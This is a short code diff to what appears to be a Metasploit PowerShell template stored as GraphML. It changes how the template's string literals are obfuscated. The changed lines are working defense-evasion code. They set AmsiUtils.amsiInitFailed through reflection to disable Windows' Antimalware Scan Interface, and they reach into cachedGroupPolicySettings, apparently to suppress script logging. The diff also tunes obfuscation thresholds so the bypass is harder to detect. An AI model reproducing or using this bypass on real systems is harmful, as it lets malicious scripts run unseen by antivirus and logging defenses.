@@ -27,12 +27,12 @@
         <node id="block.1:instruction.3">
           <data key="address">3</data>
           <data key="type">instruction</data>
-          <data key="instruction.source">    $Ref1=[Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.AmsiUtils') %&gt;);</data>
+          <data key="instruction.source">    $Ref1=[Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.AmsiUtils', threshold: 0.3) %&gt;);</data>
         </node>
         <node id="block.1:instruction.4">
           <data key="address">4</data>
           <data key="type">instruction</data>
-          <data key="instruction.source">    if ($Ref1) { $Ref1.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('amsiInitFailed') %&gt;,'NonPublic,Static').SetValue($null,$true); };</data>
+          <data key="instruction.source">    if ($Ref1) { $Ref1.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('amsiInitFailed', threshold: 0.3) %&gt;,'NonPublic,Static').SetValue($null,$true); };</data>
         </node>
         <node id="block.1:instruction.5">
           <data key="address">5</data>
@@ -42,7 +42,7 @@
         <node id="block.1:instruction.6">
           <data key="address">6</data>
           <data key="type">instruction</data>
-          <data key="instruction.source">    $GPF=$Ref2.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('cachedGroupPolicySettings') %&gt;,'NonPublic,Static');</data>
+          <data key="instruction.source">    $GPF=$Ref2.GetField('cachedGroupPolicySettings','NonPublic,Static');</data>
         </node>
         <node id="block.1:instruction.7">
           <data key="address">7</data>
